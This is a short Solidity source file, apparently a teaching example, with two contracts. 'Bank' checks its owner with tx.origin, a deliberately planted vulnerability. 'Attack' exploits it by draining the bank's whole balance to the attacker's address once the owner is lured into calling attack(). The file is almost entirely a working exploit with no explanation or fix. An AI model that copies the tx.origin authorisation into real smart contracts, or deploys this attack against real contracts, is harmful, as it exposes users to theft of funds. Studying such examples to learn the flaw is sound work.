// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Bank {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to , uint _amount) public {
        require(tx.origin == owner , "Not owner");
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent , "Failed to send Ether");
    }
}

contract Attack {
    address payable public hacker;
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
        hacker = payable(msg.sender);
    }

    function attack() public {
        bank.transfer(hacker , address(bank).balance);
    }
}